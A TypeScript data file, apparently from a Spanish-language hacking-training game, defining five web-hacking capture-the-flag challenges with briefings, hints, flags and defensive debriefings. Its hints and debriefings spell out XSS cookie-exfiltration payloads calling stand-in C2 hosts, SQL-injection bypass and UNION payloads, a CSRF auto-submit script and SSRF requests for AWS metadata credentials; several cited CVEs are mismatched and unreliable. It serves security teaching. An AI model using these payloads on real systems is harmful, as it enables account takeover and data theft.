/**
 * HackQuest – Web Hacking Branch
 * Initial 5 challenges (progressive difficulty)
 *
 * All briefings/debriefings are in Spanish.
 * Flags follow the pattern HACKQUEST{...}.
 */

import type { ChallengeData } from "@/types/game";

export const webHackingChallenges: ChallengeData[] = [
  // ================================================================
  // 1. XSS Reflejado
  // ================================================================
  {
    slug: "xss-reflected",
    title: "XSS Reflejado",
    description:
      "Encuentra y explota una vulnerabilidad de Cross-Site Scripting reflejado en un formulario de búsqueda para robar cookies de sesión.",
    branch: "WEB_HACKING",
    difficulty: "EASY",
    type: "PUZZLE",
    timeLimitSeconds: 720, // 12 min
    basePoints: 100,
    requiredRank: "SCRIPT_KIDDIE",
    isFree: true,
    orderInBranch: 1,

    briefing: `
OPERACIÓN: MIRROR GHOST
CLASIFICACIÓN: CONFIDENCIAL
AGENTE: TÚ
OBJETIVO: Servidor web de la corporación NEXCORP Industries

Tenemos constancia de que NEXCORP Industries almacena datos de disidentes en su portal corporativo.
El portal expone un buscador interno sin sanitización adecuada. Inteligencia confirma que los administradores acceden a dicha aplicación cada 30 minutos.

Tu misión es inyectar código malicioso en el parámetro de búsqueda para que, cuando el administrador abra el enlace trampa que le enviaremos, su cookie de sesión sea exfiltrada a nuestro servidor C2.

Una vez obtengas la cookie, extrae el token de autorización embebido. Ese token es la bandera.

Tiempo límite: 12 minutos. No dejes rastro.
    `.trim(),

    debriefing: `
ANÁLISIS POST-OPERACIÓN – MIRROR GHOST

TÉCNICA UTILIZADA: Cross-Site Scripting (XSS) Reflejado

El XSS reflejado ocurre cuando una aplicación toma datos controlados por el usuario desde la solicitud HTTP y los incluye en la respuesta sin la validación o codificación adecuada.

¿POR QUÉ FUNCIONA?
El servidor devuelve literalmente lo que el usuario envía en el parámetro "q". El navegador de la víctima interpreta ese contenido como código HTML/JavaScript legítimo del servidor.

VECTOR DE ATAQUE CLÁSICO:
  https://objetivo.com/search?q=<script>document.location='https://c2.attacker.com/steal?c='+document.cookie</script>

IMPACTO REAL:
- Robo de cookies de sesión → secuestro de cuenta.
- Redirección a páginas de phishing.
- Keylogging en el navegador de la víctima.
- Defacement visual selectivo para usuarios específicos.

REFERENCIA CVE:
- CVE-2021-21985 (VMware vCenter XSS – CVSS 9.8)
- CVE-2020-11022 (jQuery XSS en versiones < 1.9.1 – afectó miles de sitios)

DEFENSA:
1. Codificar SIEMPRE la salida HTML con htmlspecialchars() o equivalente.
2. Implementar Content Security Policy (CSP) con directiva script-src restrictiva.
3. Marcar cookies como HttpOnly y Secure.
4. Validar y rechazar en servidor toda entrada que no coincida con el formato esperado.
5. Usar frameworks modernos (React, Angular) que auto-escapan por defecto.
    `.trim(),

    flag: "HACKQUEST{xss_r3fl3ct3d_c00k13_st0l3n}",

    phases: [
      {
        name: "Reconocimiento del formulario",
        description:
          "Identifica el formulario de búsqueda y el parámetro vulnerable. Usa herramientas de proxy o inspección de red para capturar la petición.",
        expectedCommands: [
          "curl.*search.*q=",
          "GET.*search",
          "burp.*intercept",
          "fetch.*search",
          "wget.*search",
        ],
        hints: [
          {
            level: 1,
            text: "Inspecciona la URL de la página de resultados. ¿Qué parámetro aparece en la query string?",
          },
          {
            level: 2,
            text: "El parámetro vulnerable es 'q'. Intenta enviar texto normal primero y observa si aparece reflejado en la respuesta HTML.",
          },
          {
            level: 3,
            text: "Ejecuta: curl 'http://target/search?q=hola' y comprueba si 'hola' aparece en el body de respuesta sin escapar.",
          },
        ],
      },
      {
        name: "Prueba de reflexión",
        description:
          "Confirma que el input del usuario se refleja en la respuesta sin sanitización. Inyecta una cadena de prueba HTML inofensiva.",
        expectedCommands: [
          "q=<.*>",
          "q=.*script",
          "q=.*img",
          "q=.*onerror",
          "search.*<",
        ],
        hints: [
          {
            level: 1,
            text: "Prueba inyectar un tag HTML simple como <b>test</b> y observa la respuesta.",
          },
          {
            level: 2,
            text: "Si <b>test</b> aparece en el HTML sin escaping, el parámetro es vulnerable. Ahora prueba un payload con evento.",
          },
          {
            level: 3,
            text: "Usa: ?q=<img src=x onerror=alert(1)> para confirmar ejecución de JavaScript.",
          },
        ],
      },
      {
        name: "Construcción del payload de exfiltración",
        description:
          "Construye un payload XSS que exfiltre la cookie de sesión al servidor C2. La cookie contiene el token de autorización.",
        expectedCommands: [
          "document\\.cookie",
          "fetch.*cookie",
          "XMLHttpRequest.*cookie",
          "location.*cookie",
          "new Image.*cookie",
        ],
        hints: [
          {
            level: 1,
            text: "Para exfiltrar cookies puedes usar: document.cookie. Necesitas enviarlo a un servidor bajo tu control.",
          },
          {
            level: 2,
            text: "Un payload clásico usa fetch o Image: <script>new Image().src='http://c2/x?c='+document.cookie</script>",
          },
          {
            level: 3,
            text: "Payload completo: ?q=<script>fetch('http://c2.hackquest.local/steal?c='+encodeURIComponent(document.cookie))</script>",
          },
        ],
      },
      {
        name: "Extracción de la bandera",
        description:
          "Analiza la cookie recibida en el servidor C2. Decodifica el valor del campo 'auth_token' para obtener la flag.",
        expectedCommands: [
          "base64.*decode",
          "atob",
          "HACKQUEST\\{",
          "auth_token",
          "decode.*cookie",
        ],
        hints: [
          {
            level: 1,
            text: "La cookie contiene múltiples campos separados por punto y coma. Localiza el campo 'auth_token'.",
          },
          {
            level: 2,
            text: "El valor del auth_token está codificado en Base64. Usa 'echo <valor> | base64 -d' para decodificarlo.",
          },
          {
            level: 3,
            text: "Una vez decodificado verás el formato HACKQUEST{...}. Ese es el valor de la flag.",
          },
        ],
      },
    ],

    hints: [
      {
        level: 1,
        cost: 10,
        text: "El parámetro 'q' del buscador no aplica ningún tipo de codificación HTML en la salida. Prueba inyectar caracteres especiales como < > ' \"",
      },
      {
        level: 2,
        cost: 20,
        text: "Usa el payload <script>alert(document.cookie)</script> primero para confirmar la ejecución, luego reemplaza alert() por una llamada fetch() a tu servidor.",
      },
      {
        level: 3,
        cost: 35,
        text: "URL final: /search?q=<script>fetch('http://c2.hackquest.local/collect?data='+btoa(document.cookie))</script> — decodifica la respuesta con base64 -d.",
      },
    ],
  },

  // ================================================================
  // 2. SQL Injection Básica
  // ================================================================
  {
    slug: "sqli-basic",
    title: "SQL Injection Básica",
    description:
      "Explota una inyección SQL clásica en el formulario de login para autenticarte como administrador sin conocer la contraseña.",
    branch: "WEB_HACKING",
    difficulty: "EASY",
    type: "PUZZLE",
    timeLimitSeconds: 720, // 12 min
    basePoints: 100,
    requiredRank: "SCRIPT_KIDDIE",
    isFree: true,
    orderInBranch: 2,

    briefing: `
OPERACIÓN: GOLDEN KEY
CLASIFICACIÓN: CONFIDENCIAL
AGENTE: TÚ
OBJETIVO: Panel de administración de NEXCORP Industries

NEXCORP ha desplegado un nuevo panel de administración tras el incidente anterior.
Nuestros analistas han interceptado el tráfico y determinado que el formulario de login
construye la consulta SQL concatenando directamente los inputs del usuario.

Tu misión: acceder al panel de administración inyectando SQL en el campo de usuario.
Una vez dentro, localiza el archivo de configuración que contiene la flag.

El tiempo es un factor crítico. Los logs se rotan cada 12 minutos.
    `.trim(),

    debriefing: `
ANÁLISIS POST-OPERACIÓN – GOLDEN KEY

TÉCNICA UTILIZADA: SQL Injection – Authentication Bypass

La consulta vulnerable tiene la forma:
  SELECT * FROM users WHERE username='[INPUT]' AND password='[INPUT]'

Al inyectar ' OR '1'='1' -- el servidor ejecuta:
  SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='...'

'1'='1' siempre es verdadero y el -- comenta el resto → autenticación bypasseada.

IMPACTO REAL:
- Acceso no autorizado a paneles de administración.
- Extracción completa de bases de datos (SQLi + UNION).
- Modificación o eliminación de datos críticos.
- Escalada de privilegios dentro de la aplicación.

REFERENCIA CVE:
- CVE-2012-1823 (PHP CGI argument injection – causa raíz similar)
- CVE-2019-19781 (Citrix ADC SQLi – CVSS 9.8, afectó miles de empresas)
- CVE-2021-27101 (Accellion FTA SQLi – usado en breach masivo)

DEFENSA:
1. Usar SIEMPRE consultas parametrizadas (PreparedStatements).
2. Nunca concatenar input del usuario en consultas SQL.
3. Aplicar el principio de mínimo privilegio al usuario de base de datos.
4. Implementar WAF con reglas de detección SQLi.
5. Registrar y alertar sobre intentos de login con caracteres especiales.
    `.trim(),

    flag: "HACKQUEST{sql1_4uth_byp4ss_4dm1n}",

    phases: [
      {
        name: "Identificación del vector",
        description:
          "Identifica el formulario de login y determina si es vulnerable a SQL Injection enviando caracteres especiales.",
        expectedCommands: [
          "curl.*login",
          "POST.*username",
          "username=.*'",
          "sqlmap.*url",
          "login.*form",
        ],
        hints: [
          {
            level: 1,
            text: "Envía una comilla simple (') en el campo username. Si la aplicación devuelve un error SQL, es vulnerable.",
          },
          {
            level: 2,
            text: "Usa curl: curl -X POST http://target/login -d \"username='&password=test\" y observa si hay un error de sintaxis SQL en la respuesta.",
          },
          {
            level: 3,
            text: "Un error como 'You have an error in your SQL syntax' confirma la vulnerabilidad. El servidor está mostrando errores de base de datos directamente.",
          },
        ],
      },
      {
        name: "Construcción del payload de bypass",
        description:
          "Construye el payload de inyección SQL para autenticarte como el usuario administrador sin contraseña.",
        expectedCommands: [
          "OR.*1.*=.*1",
          "' OR ",
          "-- -",
          "#.*login",
          "admin.*'",
        ],
        hints: [
          {
            level: 1,
            text: "El truco clásico es hacer que la condición WHERE siempre sea verdadera. ¿Qué expresión SQL siempre evalúa a TRUE?",
          },
          {
            level: 2,
            text: "Prueba en el campo username: admin'-- (comenta el resto de la consulta). En MySQL el comentario es -- o #.",
          },
          {
            level: 3,
            text: "Payload de bypass: username=admin'-- &password=cualquiercosa. Esto ejecuta: SELECT * FROM users WHERE username='admin'--' AND password='...'",
          },
        ],
      },
      {
        name: "Acceso al panel de administración",
        description:
          "Usa el payload para acceder al panel. Una vez dentro, navega por las rutas de administración para localizar el archivo de configuración.",
        expectedCommands: [
          "curl.*admin",
          "session.*cookie",
          "GET.*dashboard",
          "GET.*config",
          "wget.*admin",
        ],
        hints: [
          {
            level: 1,
            text: "El servidor debería devolver una cookie de sesión al autenticarte correctamente. Úsala para las siguientes peticiones.",
          },
          {
            level: 2,
            text: "Guarda la cookie con -c cookies.txt en curl y úsala con -b cookies.txt en peticiones posteriores.",
          },
          {
            level: 3,
            text: "curl -X POST http://target/login -d \"username=admin'--&password=x\" -c /tmp/cookies.txt && curl http://target/admin/config -b /tmp/cookies.txt",
          },
        ],
      },
      {
        name: "Extracción de la flag",
        description:
          "Dentro del panel de administración, localiza y lee el archivo de configuración que contiene la flag.",
        expectedCommands: [
          "config.*flag",
          "HACKQUEST\\{",
          "GET.*flag",
          "settings.*secret",
          "/admin/.*config",
        ],
        hints: [
          {
            level: 1,
            text: "Navega a /admin/settings o /admin/config. El panel tiene una sección de 'Configuración del sistema'.",
          },
          {
            level: 2,
            text: "Busca en la página HTML el patrón HACKQUEST{. Puedes usar: curl ... | grep -o 'HACKQUEST{[^}]*}'",
          },
          {
            level: 3,
            text: "curl http://target/admin/config -b /tmp/cookies.txt | grep -o 'HACKQUEST{[^}]*}'",
          },
        ],
      },
    ],

    hints: [
      {
        level: 1,
        cost: 10,
        text: "La consulta SQL construida por el servidor tiene la forma: SELECT * FROM users WHERE user='[TU_INPUT]' AND pass='[TU_INPUT]'. Piensa cómo romper esa sintaxis con una comilla.",
      },
      {
        level: 2,
        cost: 20,
        text: "Payload de username: ' OR 1=1-- (fíjate en el espacio después de --). Esto comenta la comprobación de contraseña y fuerza TRUE en la condición.",
      },
      {
        level: 3,
        cost: 35,
        text: "Comando completo: curl -X POST http://target/login -d \"username=' OR 1=1-- &password=x\" -c /tmp/c.txt -L && curl http://target/admin/flag -b /tmp/c.txt",
      },
    ],
  },

  // ================================================================
  // 3. SQL Injection Union Based
  // ================================================================
  {
    slug: "sqli-union",
    title: "SQL Injection Union Based",
    description:
      "Utiliza UNION SELECT para extraer datos de tablas ocultas de la base de datos a través de un parámetro vulnerable en la URL.",
    branch: "WEB_HACKING",
    difficulty: "MEDIUM",
    type: "PUZZLE",
    timeLimitSeconds: 1500, // 25 min
    basePoints: 200,
    requiredRank: "JUNIOR",
    isFree: false,
    orderInBranch: 3,

    briefing: `
OPERACIÓN: DATA HARVEST
CLASIFICACIÓN: SECRETO
AGENTE: TÚ
OBJETIVO: Base de datos de inteligencia de NEXCORP Industries

Los analistas han localizado un endpoint de consulta de productos que acepta un parámetro 'id' sin validar.
La estructura interna de la base de datos indica la existencia de una tabla 'classified_intel'
con columnas 'agent_code' y 'mission_data'.

Necesitamos los datos de la tabla classified_intel sin tener acceso directo al servidor de base de datos.
Usa UNION SELECT para pivotar a esa tabla y exfiltrar la clave de misión.

El código de agente objetivo es 'NEXCORP-7'. Extrae su mission_data.
El tiempo límite es 25 minutos. La operación debe quedar limpia.
    `.trim(),

    debriefing: `
ANÁLISIS POST-OPERACIÓN – DATA HARVEST

TÉCNICA UTILIZADA: SQL Injection UNION Based

Esta técnica permite añadir resultados de una consulta SELECT adicional a la consulta original.
Requisitos para que funcione:
  1. La consulta original debe devolver resultados visibles en la respuesta.
  2. El número de columnas del UNION debe coincidir con la consulta original.
  3. Los tipos de datos deben ser compatibles.

PROCESO:
  PASO 1: Determinar número de columnas con ORDER BY
    ?id=1 ORDER BY 1--   (OK)
    ?id=1 ORDER BY 2--   (OK)
    ?id=1 ORDER BY 3--   (ERROR → 2 columnas)

  PASO 2: Identificar columnas visibles
    ?id=-1 UNION SELECT 1,2--

  PASO 3: Extraer datos
    ?id=-1 UNION SELECT agent_code,mission_data FROM classified_intel WHERE agent_code='NEXCORP-7'--

IMPACTO REAL:
- Extracción completa de esquemas y tablas.
- Robo de credenciales de usuarios y administradores.
- Acceso a datos cifrados almacenados en BD.
- En configuraciones legacy: lectura de ficheros del sistema operativo (LOAD_FILE).

REFERENCIA CVE:
- CVE-2014-0160 (Heartbleed – tipo de exfiltración similar conceptualmente)
- CVE-2018-1000136 (Electron SQLi)
- CVE-2023-23752 (Joomla SQLi – CVSS 5.3, ampliamente explotada en 2023)

DEFENSA:
1. Consultas parametrizadas como primera y única línea de defensa real.
2. Deshabilitar información de error de BD en producción.
3. Principio de mínimo privilegio: el usuario de BD no debe poder SELECT en todas las tablas.
4. WAF con detección de UNION SELECT.
    `.trim(),

    flag: "HACKQUEST{un10n_s3l3ct_d4t4_h4rv3st}",

    phases: [
      {
        name: "Detección de la vulnerabilidad",
        description:
          "Confirma que el parámetro 'id' es vulnerable a SQL Injection enviando payloads de test.",
        expectedCommands: [
          "id=.*'",
          "id=.*AND",
          "id=.*OR",
          "curl.*product.*id",
          "sqlmap.*id",
        ],
        hints: [
          {
            level: 1,
            text: "Accede a /products?id=1 y luego a /products?id=1' para ver si el error SQL es visible.",
          },
          {
            level: 2,
            text: "Prueba: ?id=1 AND 1=1 (respuesta normal) vs ?id=1 AND 1=2 (sin resultados). Esto confirma SQLi booleana.",
          },
          {
            level: 3,
            text: "curl 'http://target/products?id=1 AND 1=2--' — si el producto desaparece de la respuesta, el parámetro es inyectable.",
          },
        ],
      },
      {
        name: "Enumeración de columnas",
        description:
          "Determina el número exacto de columnas que devuelve la consulta original usando ORDER BY.",
        expectedCommands: [
          "ORDER BY",
          "order by",
          "GROUP BY",
          "id=.*[0-9]+--",
          "NULL.*NULL",
        ],
        hints: [
          {
            level: 1,
            text: "Usa ORDER BY n-- incrementando n hasta que obtengas un error. El n-1 que no da error es el número de columnas.",
          },
          {
            level: 2,
            text: "Prueba: ?id=1 ORDER BY 1-- luego ?id=1 ORDER BY 2-- etc. Cuando aparezca el error 'Unknown column' o similar, has superado el límite.",
          },
          {
            level: 3,
            text: "La aplicación tiene 3 columnas. Confirma con: ?id=1 ORDER BY 3-- (OK) y ?id=1 ORDER BY 4-- (ERROR).",
          },
        ],
      },
      {
        name: "Identificación de columnas visibles",
        description:
          "Usa UNION SELECT con valores numéricos para identificar qué columnas se reflejan en la respuesta HTML.",
        expectedCommands: [
          "UNION SELECT",
          "union select",
          "UNION.*NULL",
          "-1.*UNION",
          "id=-1",
        ],
        hints: [
          {
            level: 1,
            text: "Para que UNION funcione, el id original no debe devolver resultados. Usa un id negativo o inexistente como id=0 o id=-1.",
          },
          {
            level: 2,
            text: "Prueba: ?id=-1 UNION SELECT 1,2,3-- y observa qué números aparecen reflejados en la página.",
          },
          {
            level: 3,
            text: "Si ves el número 2 en la página donde normalmente aparece el nombre del producto, la columna 2 es visible. Úsala para extraer datos.",
          },
        ],
      },
      {
        name: "Extracción de datos de classified_intel",
        description:
          "Construye el payload UNION SELECT final para extraer la mission_data del agente NEXCORP-7.",
        expectedCommands: [
          "classified_intel",
          "mission_data",
          "agent_code",
          "NEXCORP-7",
          "UNION SELECT.*FROM",
        ],
        hints: [
          {
            level: 1,
            text: "Adapta el UNION SELECT para apuntar a la tabla classified_intel con sus columnas agent_code y mission_data.",
          },
          {
            level: 2,
            text: "Usa WHERE para filtrar por el agente objetivo: ?id=-1 UNION SELECT 1,mission_data,3 FROM classified_intel WHERE agent_code='NEXCORP-7'--",
          },
          {
            level: 3,
            text: "curl 'http://target/products?id=-1 UNION SELECT 1,mission_data,3 FROM classified_intel WHERE agent_code=0x4e455843-4f52502d37--'",
          },
        ],
      },
    ],

    hints: [
      {
        level: 1,
        cost: 20,
        text: "El endpoint /products?id=N es vulnerable. Comienza determinando el número de columnas con ORDER BY. La consulta original tiene 3 columnas.",
      },
      {
        level: 2,
        cost: 40,
        text: "La columna visible es la número 2. Usa: ?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- para listar tablas.",
      },
      {
        level: 3,
        cost: 70,
        text: "Payload final: ?id=-1 UNION SELECT 1,mission_data,3 FROM classified_intel WHERE agent_code='NEXCORP-7'-- El resultado contiene la flag HACKQUEST{...}.",
      },
    ],
  },

  // ================================================================
  // 4. CSRF Token Bypass
  // ================================================================
  {
    slug: "csrf-token-bypass",
    title: "CSRF Token Bypass",
    description:
      "Evade la protección CSRF de un panel de administración para ejecutar acciones no autorizadas en nombre de un usuario autenticado.",
    branch: "WEB_HACKING",
    difficulty: "MEDIUM",
    type: "PUZZLE",
    timeLimitSeconds: 1500, // 25 min
    basePoints: 200,
    requiredRank: "JUNIOR",
    isFree: false,
    orderInBranch: 4,

    briefing: `
OPERACIÓN: PUPPET MASTER
CLASIFICACIÓN: SECRETO
AGENTE: TÚ
OBJETIVO: Sistema de gestión de usuarios de NEXCORP Industries

El administrador de NEXCORP mantiene una sesión activa durante toda la jornada laboral.
El sistema implementa tokens CSRF para proteger las acciones, pero inteligencia indica
que la implementación tiene un fallo crítico: el token es predecible o se puede obtener
mediante una petición GET al endpoint de perfil.

Tu misión: crear una página web trampa que, cuando el administrador la visite,
ejecute automáticamente una acción de cambio de email en su cuenta.
Una vez modifiques el email, podrás usar el proceso de recuperación para acceder a su cuenta.
La flag se encuentra en el panel de administración bajo /admin/classified.
    `.trim(),

    debriefing: `
ANÁLISIS POST-OPERACIÓN – PUPPET MASTER

TÉCNICA UTILIZADA: Cross-Site Request Forgery (CSRF) con Token Bypass

CSRF explota la confianza que un servidor tiene en el navegador de un usuario autenticado.
El servidor no puede distinguir si una petición fue iniciada voluntariamente o de forma forzada.

FALLOS COMUNES EN IMPLEMENTACIÓN DE CSRF:
  1. Token predecible (basado en timestamp o user_id).
  2. Token no verificado en el servidor (solo del lado cliente).
  3. Token válido para cualquier acción, no ligado a la acción específica.
  4. Token filtrado en cabeceras Referer o en la URL.
  5. CORS mal configurado permite leer el token desde otro dominio.

TÉCNICA DE BYPASS USADA:
El endpoint GET /api/user/profile devuelve el CSRF token en el JSON de respuesta
(fallo de diseño). Un script desde otro origen puede leer ese token si CORS no está
correctamente restringido, y luego usarlo en la petición POST maliciosa.

IMPACTO REAL:
- Cambio de email/contraseña → secuestro de cuenta.
- Transferencias bancarias no autorizadas.
- Modificación de configuración crítica.
- Creación de usuarios administradores.

REFERENCIA CVE:
- CVE-2023-35708 (MOVEit Transfer CSRF → SQLi)
- CVE-2022-29464 (WSO2 CSRF – CVSS 9.8)
- CVE-2020-12720 (vBulletin CSRF para RCE)

DEFENSA:
1. Tokens CSRF criptográficamente aleatorios vinculados a la sesión.
2. Verificación del header Origin/Referer en el servidor.
3. SameSite=Strict en cookies de sesión.
4. Double Submit Cookie pattern como alternativa.
5. No exponer el CSRF token en endpoints GET accesibles por otros orígenes.
    `.trim(),

    flag: "HACKQUEST{csrf_t0k3n_byp4ss_pupp3t}",

    phases: [
      {
        name: "Análisis del mecanismo CSRF",
        description:
          "Analiza cómo la aplicación implementa la protección CSRF. Captura una petición legítima con Burp Suite o las DevTools.",
        expectedCommands: [
          "curl.*profile",
          "GET.*csrf",
          "token.*header",
          "X-CSRF.*Token",
          "meta.*csrf",
        ],
        hints: [
          {
            level: 1,
            text: "Abre las DevTools del navegador, ve a la pestaña Network, realiza una acción en la aplicación y observa las cabeceras de las peticiones POST.",
          },
          {
            level: 2,
            text: "Busca el CSRF token en: campos ocultos del formulario (<input type=hidden name=csrf_token>), cabeceras HTTP (X-CSRF-Token), o meta tags.",
          },
          {
            level: 3,
            text: "El token también se devuelve en: GET /api/user/profile → campo 'csrf_token' en el JSON. ¿Es accesible desde otros orígenes?",
          },
        ],
      },
      {
        name: "Identificación del fallo en CORS",
        description:
          "Verifica si el endpoint que devuelve el CSRF token tiene CORS mal configurado, permitiendo lectura desde orígenes externos.",
        expectedCommands: [
          "Access-Control-Allow-Origin",
          "CORS.*origin",
          "curl.*-H.*Origin",
          "OPTIONS.*profile",
          "cors.*check",
        ],
        hints: [
          {
            level: 1,
            text: "Envía una petición con cabecera Origin: http://attacker.com al endpoint /api/user/profile y examina la respuesta.",
          },
          {
            level: 2,
            text: "Si la respuesta incluye Access-Control-Allow-Origin: * o Access-Control-Allow-Origin: http://attacker.com, puedes leer la respuesta desde JavaScript externo.",
          },
          {
            level: 3,
            text: "curl http://target/api/user/profile -H 'Origin: http://evil.com' -H 'Cookie: session=ADMIN_SESSION' -v 2>&1 | grep Access-Control",
          },
        ],
      },
      {
        name: "Construcción de la página trampa",
        description:
          "Crea una página HTML maliciosa que obtenga el CSRF token del endpoint vulnerable y luego ejecute la petición de cambio de email.",
        expectedCommands: [
          "fetch.*profile.*csrf",
          "form.*action.*email",
          "XMLHttpRequest.*token",
          "submit.*form",
          "autosubmit",
        ],
        hints: [
          {
            level: 1,
            text: "La página trampa necesita dos pasos: primero fetch() al endpoint de perfil para obtener el token, luego construir y enviar el formulario con ese token.",
          },
          {
            level: 2,
            text: "Estructura del ataque: fetch('/api/user/profile').then(r=>r.json()).then(data => { const form = document.createElement('form'); form.method='POST'; form.action='/api/user/email'; ... })",
          },
          {
            level: 3,
            text: "Añade un campo con el csrf_token obtenido: const t = document.createElement('input'); t.name='csrf_token'; t.value=data.csrf_token; form.appendChild(t); form.submit();",
          },
        ],
      },
      {
        name: "Acceso al panel y extracción de la flag",
        description:
          "Con el email del administrador bajo tu control, usa la recuperación de contraseña para acceder al panel. La flag está en /admin/classified.",
        expectedCommands: [
          "password.*reset",
          "recover.*account",
          "GET.*classified",
          "HACKQUEST\\{",
          "/admin/classified",
        ],
        hints: [
          {
            level: 1,
            text: "Una vez cambiado el email del admin, usa la función 'Olvidé mi contraseña' con ese email para recibir el enlace de reset.",
          },
          {
            level: 2,
            text: "Tras resetear la contraseña accede al panel de admin en /admin/classified con las nuevas credenciales.",
          },
          {
            level: 3,
            text: "curl http://target/admin/classified -b 'session=TU_NUEVA_SESION' | grep -o 'HACKQUEST{[^}]*}'",
          },
        ],
      },
    ],

    hints: [
      {
        level: 1,
        cost: 20,
        text: "El endpoint GET /api/user/profile devuelve el CSRF token del usuario autenticado en el campo JSON 'csrf_token'. La configuración CORS permite leerlo desde cualquier origen.",
      },
      {
        level: 2,
        cost: 40,
        text: "Crea un HTML con: <script>fetch('http://target/api/user/profile',{credentials:'include'}).then(r=>r.json()).then(d=>{document.getElementById('t').value=d.csrf_token;document.forms[0].submit()})</script>",
      },
      {
        level: 3,
        cost: 70,
        text: "Crea csrf.html con fetch al profile para obtener el token, luego POST a /api/user/update-email con {email:'attacker@evil.com', csrf_token: token}. Usa el reset de password para entrar como admin.",
      },
    ],
  },

  // ================================================================
  // 5. SSRF a Servicios Internos
  // ================================================================
  {
    slug: "ssrf-internal",
    title: "SSRF a Servicios Internos",
    description:
      "Explota una vulnerabilidad Server-Side Request Forgery para acceder a servicios internos protegidos por firewall y exfiltrar metadatos de la instancia cloud.",
    branch: "WEB_HACKING",
    difficulty: "HARD",
    type: "SANDBOX",
    timeLimitSeconds: 2700, // 45 min
    basePoints: 350,
    requiredRank: "PENTESTER",
    isFree: false,
    orderInBranch: 5,

    briefing: `
OPERACIÓN: INNER SANCTUM
CLASIFICACIÓN: TOP SECRET / COMPARTIMENTADO
AGENTE: TÚ
OBJETIVO: Infraestructura cloud de NEXCORP Industries (AWS)

NEXCORP ha migrado su infraestructura a AWS. Su aplicación web incluye una funcionalidad
de "previsualizador de URLs" para cargar imágenes remotas. Los controles de seguridad
en esa funcionalidad son insuficientes.

La aplicación corre en una instancia EC2. El servicio de metadatos de AWS (IMDSv1)
está activo en 169.254.169.254. Internamente también corre un servicio Redis en
127.0.0.1:6379 y un panel de administración en 192.168.1.100:8080.

Objetivos por orden de prioridad:
  1. Confirmar SSRF a través del endpoint /api/fetch-preview.
  2. Acceder al servicio de metadatos de AWS y obtener las credenciales IAM temporales.
  3. Pivotar al panel interno de administración en 192.168.1.100:8080.
  4. Extraer la flag del endpoint /internal/classified del panel interno.

Esta operación tiene nivel de dificultad máximo. Tienes 45 minutos.
    `.trim(),

    debriefing: `
ANÁLISIS POST-OPERACIÓN – INNER SANCTUM

TÉCNICA UTILIZADA: Server-Side Request Forgery (SSRF)

SSRF permite al atacante inducir al servidor a realizar peticiones HTTP a destinos arbitrarios,
incluyendo recursos internos inaccesibles directamente desde internet.

VECTORES COMUNES DE SSRF:
  - Funcionalidades de fetch de URL: cargadores de imágenes, webhooks, previsualizadores.
  - APIs que aceptan URLs como parámetro de callback.
  - Importadores de datos externos (XML con DTD, JSON con referencias externas).
  - PDF generators que renderizan HTML con iframes remotos.

TÉCNICAS DE BYPASS DE FILTROS SSRF:
  - Redirecciones HTTP 301/302 desde servidor controlado.
  - Representaciones alternativas de IP: 2130706433 = 127.0.0.1 (decimal), 0x7f000001 (hex).
  - DNS rebinding para evadir validaciones basadas en resolución de nombres.
  - Protocolo file:// para leer ficheros locales.
  - Protocolo dict:// para interactuar con servicios de texto (Redis, Memcached).

CASO REAL: Capital One Breach (2019)
  - Un SSRF en un proxy mal configurado permitió al atacante acceder al IMDS de AWS EC2.
  - Obtuvo credenciales IAM temporales con permisos de lectura en S3.
  - Exfiltró datos de más de 100 millones de clientes.
  - Coste estimado: 80 millones USD en multas y compensaciones.

REFERENCIA CVE:
  - CVE-2021-26084 (Confluence SSRF → RCE – CVSS 9.8)
  - CVE-2022-22954 (VMware Workspace ONE SSRF – CVSS 9.8)
  - CVE-2019-11043 (PHP-FPM SSRF – usado en breach de Capital One)

DEFENSA:
  1. Migrar a IMDSv2 (requiere token de sesión, previene SSRF básico en AWS).
  2. Validar y allowlistar dominios permitidos en el servidor (no solo en cliente).
  3. Bloquear a nivel de firewall el acceso del proceso web a 169.254.169.254.
  4. Segmentar la red interna: la aplicación web no debe poder alcanzar servicios internos críticos.
  5. Deshabilitar redirecciones automáticas en la librería HTTP del servidor.
  6. Usar SSRF-safe libraries con validación de destino incorporada.
    `.trim(),

    flag: "HACKQUEST{ssrf_4ws_1m4ds_1nt3rn4l_pwn3d}",

    phases: [
      {
        name: "Descubrimiento del endpoint vulnerable",
        description:
          "Localiza el endpoint /api/fetch-preview y confirma que acepta URLs arbitrarias. Verifica que el servidor realiza la petición en el servidor.",
        expectedCommands: [
          "curl.*/api/fetch-preview",
          "url=http",
          "fetch-preview.*url",
          "burp.*fetch",
          "POST.*preview",
        ],
        hints: [
          {
            level: 1,
            text: "El endpoint acepta un parámetro 'url' por POST. Prueba primero con una URL legítima y luego con tu servidor para confirmar que la petición sale desde el servidor web.",
          },
          {
            level: 2,
            text: "Usa un servicio como requestbin.com o Burp Collaborator. Si recibes la petición entrante desde la IP del servidor, SSRF está confirmado.",
          },
          {
            level: 3,
            text: "curl -X POST http://target/api/fetch-preview -d 'url=http://TU_IP:PORT/' — observa los logs de tu servidor para confirmar la petición entrante desde el target.",
          },
        ],
      },
      {
        name: "Acceso al IMDS de AWS",
        description:
          "Explota el SSRF para acceder al servicio de metadatos de instancia de AWS en 169.254.169.254 y obtener las credenciales IAM temporales.",
        expectedCommands: [
          "169\\.254\\.169\\.254",
          "metadata.*latest",
          "iam.*security-credentials",
          "meta-data.*role",
          "169.*meta",
        ],
        hints: [
          {
            level: 1,
            text: "El IMDS de AWS está siempre en http://169.254.169.254/latest/meta-data/. Úsalo como valor del parámetro 'url'.",
          },
          {
            level: 2,
            text: "Para obtener credenciales IAM: http://169.254.169.254/latest/meta-data/iam/security-credentials/ primero lista los roles disponibles.",
          },
          {
            level: 3,
            text: "Secuencia: 1) url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ → obtén nombre del rol. 2) url=http://169.254.169.254/latest/meta-data/iam/security-credentials/NOMBRE_ROL → obtén AccessKeyId, SecretAccessKey y Token.",
          },
        ],
      },
      {
        name: "Pivote a la red interna",
        description:
          "Usa el SSRF para alcanzar el panel de administración interno en 192.168.1.100:8080. Enumera los endpoints disponibles.",
        expectedCommands: [
          "192\\.168\\.1\\.100",
          "url=http.*8080",
          "internal.*admin",
          "192.*8080",
          "pivot.*internal",
        ],
        hints: [
          {
            level: 1,
            text: "El servidor web puede alcanzar IPs internas. Prueba con url=http://192.168.1.100:8080/ para ver si responde el panel interno.",
          },
          {
            level: 2,
